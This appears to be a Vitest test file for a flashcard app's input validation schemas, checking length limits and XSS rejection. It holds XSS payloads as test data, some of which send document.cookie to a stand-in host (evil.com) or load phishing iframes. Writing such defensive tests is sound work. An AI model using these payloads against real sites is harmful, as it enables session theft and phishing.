import { describe, it, expect } from "vitest";
import { flashcardProposalSchema, parsedFlashcardsResponseSchema, generateFlashcardsSchema } from "./generation.schema";

describe("flashcardProposalSchema", () => {
  describe("valid flashcards", () => {
    it("should accept valid flashcard with educational content", () => {
      const validFlashcard = {
        front: "Co to jest fotosynteza?",
        back: "Proces, w którym rośliny przekształcają energię słoneczną w energię chemiczną.",
      };

      const result = flashcardProposalSchema.safeParse(validFlashcard);
      expect(result.success).toBe(true);
    });

    it("should accept flashcard at max length limits", () => {
      const flashcard = {
        front: "a".repeat(500),
        back: "b".repeat(1000),
      };

      const result = flashcardProposalSchema.safeParse(flashcard);
      expect(result.success).toBe(true);
    });
  });

  describe("length validation", () => {
    it("should reject empty front", () => {
      const flashcard = { front: "", back: "Answer" };
      const result = flashcardProposalSchema.safeParse(flashcard);

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toBe("Pytanie nie może być puste");
      }
    });

    it("should reject empty back", () => {
      const flashcard = { front: "Question", back: "" };
      const result = flashcardProposalSchema.safeParse(flashcard);

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toBe("Odpowiedź nie może być pusta");
      }
    });

    it("should reject front exceeding 500 characters", () => {
      const flashcard = { front: "a".repeat(501), back: "Answer" };
      const result = flashcardProposalSchema.safeParse(flashcard);

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toBe("Pytanie nie może przekraczać 500 znaków");
      }
    });

    it("should reject back exceeding 1000 characters", () => {
      const flashcard = { front: "Question", back: "b".repeat(1001) };
      const result = flashcardProposalSchema.safeParse(flashcard);

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toBe("Odpowiedź nie może przekraczać 1000 znaków");
      }
    });
  });

  describe("XSS protection in front field", () => {
    const xssAttacks = [
      "<script>alert('xss')</script>",
      "<SCRIPT>document.cookie</SCRIPT>",
      "<script src='evil.js'>",
      "<iframe src='phishing.com'>",
      "javascript:alert(1)",
      "onclick=malicious()",
      "<img src=x onerror=alert(1)>",
      "<svg onload=hack()>",
    ];

    xssAttacks.forEach((attack) => {
      it(`should reject XSS in front: ${attack.substring(0, 30)}...`, () => {
        const flashcard = { front: `Question ${attack}`, back: "Safe answer" };
        const result = flashcardProposalSchema.safeParse(flashcard);

        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toBe("Niedozwolona treść w pytaniu");
        }
      });
    });
  });

  describe("XSS protection in back field", () => {
    const xssAttacks = [
      "<script>steal(cookies)</script>",
      '<iframe src="evil.com"></iframe>',
      "javascript:void(0)",
      "onmouseover=attack()",
      '<img src="" onerror="hack()">',
      '<svg/onload="malicious()">',
    ];

    xssAttacks.forEach((attack) => {
      it(`should reject XSS in back: ${attack.substring(0, 30)}...`, () => {
        const flashcard = { front: "Safe question", back: `Answer ${attack}` };
        const result = flashcardProposalSchema.safeParse(flashcard);

        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toBe("Niedozwolona treść w odpowiedzi");
        }
      });
    });
  });

  describe("should allow safe content that might look suspicious", () => {
    const safeContent = [
      { front: "Co to jest JavaScript?", back: "Język programowania" },
      { front: "Opisz element <div>", back: "Element blokowy HTML" },
      { front: "Co robi console.log()?", back: "Wypisuje do konsoli" },
      { front: "Wartość x < 5", back: "x jest mniejsze od 5" },
      { front: "Funkcja onclick w React", back: "Handler zdarzenia kliknięcia" },
    ];

    safeContent.forEach(({ front, back }) => {
      it(`should accept: "${front.substring(0, 25)}..."`, () => {
        const result = flashcardProposalSchema.safeParse({ front, back });
        expect(result.success).toBe(true);
      });
    });
  });
});

describe("parsedFlashcardsResponseSchema", () => {
  it("should accept valid response with multiple flashcards", () => {
    const response = {
      flashcards: [
        { front: "Question 1", back: "Answer 1" },
        { front: "Question 2", back: "Answer 2" },
      ],
    };

    const result = parsedFlashcardsResponseSchema.safeParse(response);
    expect(result.success).toBe(true);
  });

  it("should accept empty flashcards array", () => {
    const response = { flashcards: [] };
    const result = parsedFlashcardsResponseSchema.safeParse(response);
    expect(result.success).toBe(true);
  });

  it("should reject response without flashcards key", () => {
    const response = { cards: [] };
    const result = parsedFlashcardsResponseSchema.safeParse(response);
    expect(result.success).toBe(false);
  });

  it("should reject if any flashcard contains XSS", () => {
    const response = {
      flashcards: [
        { front: "Safe question", back: "Safe answer" },
        { front: "<script>alert(1)</script>", back: "Injected" },
      ],
    };

    const result = parsedFlashcardsResponseSchema.safeParse(response);
    expect(result.success).toBe(false);
  });

  it("should reject malformed flashcard in array", () => {
    const response = {
      flashcards: [{ front: "Question only" }],
    };

    const result = parsedFlashcardsResponseSchema.safeParse(response);
    expect(result.success).toBe(false);
  });
});

describe("generateFlashcardsSchema", () => {
  it("should accept text with minimum 1000 characters", () => {
    const input = { source_text: "a".repeat(1000) };
    const result = generateFlashcardsSchema.safeParse(input);
    expect(result.success).toBe(true);
  });

  it("should accept text with maximum 10000 characters", () => {
    const input = { source_text: "a".repeat(10000) };
    const result = generateFlashcardsSchema.safeParse(input);
    expect(result.success).toBe(true);
  });

  it("should reject text shorter than 1000 characters", () => {
    const input = { source_text: "a".repeat(999) };
    const result = generateFlashcardsSchema.safeParse(input);

    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].message).toBe("Tekst źródłowy musi zawierać co najmniej 1000 znaków");
    }
  });

  it("should reject text longer than 10000 characters", () => {
    const input = { source_text: "a".repeat(10001) };
    const result = generateFlashcardsSchema.safeParse(input);

    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].message).toBe("Tekst źródłowy nie może przekraczać 10000 znaków");
    }
  });

  it("should reject missing source_text", () => {
    const input = {};
    const result = generateFlashcardsSchema.safeParse(input);

    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].message).toBe("Pole source_text jest wymagane");
    }
  });
});

describe("integration: malicious AI responses", () => {
  const maliciousResponses = [
    {
      name: "XSS in question",
      response: {
        flashcards: [
          {
            front: "What is <script>document.location='http://evil.com?c='+document.cookie</script>?",
            back: "A type of attack",
          },
        ],
      },
    },
    {
      name: "XSS in answer",
      response: {
        flashcards: [
          {
            front: "What is XSS?",
            back: "Example: <img src=x onerror=alert(document.cookie)>",
          },
        ],
      },
    },
    {
      name: "iframe injection",
      response: {
        flashcards: [
          {
            front: "Embedded content",
            back: '<iframe src="https://phishing-site.com/fake-login"></iframe>',
          },
        ],
      },
    },
    {
      name: "javascript protocol",
      response: {
        flashcards: [
          {
            front: "Click here",
            back: "javascript:window.location='http://evil.com'",
          },
        ],
      },
    },
    {
      name: "event handler attack",
      response: {
        flashcards: [
          {
            front: "Hover attack",
            back: "onmouseover=fetch('http://evil.com/steal?data='+document.cookie)",
          },
        ],
      },
    },
  ];

  maliciousResponses.forEach(({ name, response }) => {
    it(`should reject ${name}`, () => {
      const result = parsedFlashcardsResponseSchema.safeParse(response);
      expect(result.success).toBe(false);
    });
  });
});
